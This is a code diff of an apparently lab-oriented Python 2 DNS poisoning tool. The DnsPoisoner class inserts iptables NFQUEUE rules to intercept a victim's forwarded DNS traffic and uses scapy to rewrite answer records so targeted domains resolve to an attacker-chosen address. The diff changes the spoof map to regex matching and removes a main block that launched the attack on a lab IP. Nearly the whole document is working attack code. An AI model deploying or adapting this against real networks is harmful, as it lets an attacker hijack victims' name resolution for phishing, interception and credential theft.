@@ -8,7 +8,7 @@ class DnsPoisoner():
 
     def __init__(self, ip_victim, queue_num):
 
-        self.urls_to_spoof = {b"www.example.com.":"10.0.123.6"}
+        self.urls_to_spoof = {}
         self.queue         = NetfilterQueue()    #Initialize netfilterqueue object  
         #Create rules on how to handles packets destined for your LAN
         self.iprule_add    = "iptables -I FORWARD -p udp -d {} -j NFQUEUE --queue-num {}".format(ip_victim, queue_num)    #packets matching this rule get send to queue_num
@@ -27,7 +27,9 @@ class DnsPoisoner():
     def get_ip(self, url):
         
         for url_pattern in self.urls_to_spoof.keys():
-            if url_pattern == url:
+
+            if url_pattern.match(url):
+
                 return self.urls_to_spoof[url_pattern]
 
     def handle_packet(self, packet_nfqueue):
@@ -35,10 +37,10 @@ class DnsPoisoner():
         packet_scapy = IP(packet_nfqueue.get_payload())    #converts the raw packet to a scapy compatible string
 
         if packet_scapy.haslayer(DNSRR):
+            print "Packet has DNSRR"
             packet_scapy = self.edit_dnsrr(packet_scapy)    #edit packet for spoof
             packet_nfqueue.set_payload(bytes(packet_scapy))    #converts scapy compatible string back to raw packet
 
-        print "Packet accepted"
         return packet_nfqueue.accept()    #accept the packet and release it back into the wild
 
     def edit_dnsrr(self, packet):
@@ -56,11 +58,9 @@ class DnsPoisoner():
                 del(packet[IP].chksum)
                 del(packet[UDP].len)
                 del(packet[UDP].chksum)
-                print "IPv4 packet"
             
             # ipv6
             elif packet[DNSQR].qtype == 28:
-                print "IPv6 packet"
                 pass # TODO wat te doen met ipv6?
                 # packet[DNSRR].rdata = ip_to_spoof
                 # packet[DNS].ancount = 1
@@ -85,10 +85,3 @@ class DnsPoisoner():
         self.queue.unbind()    #delete queue
 
         print "DNS poisoning attack stopped"
-
-if __name__ == "__main__":
-    ip_victim = "10.0.123.5"
-    dns_poisoner = DnsPoisoner(ip_victim, 1)
-    dns_poisoner.start()
-    time.sleep(20)
-    dns_poisoner.stop()
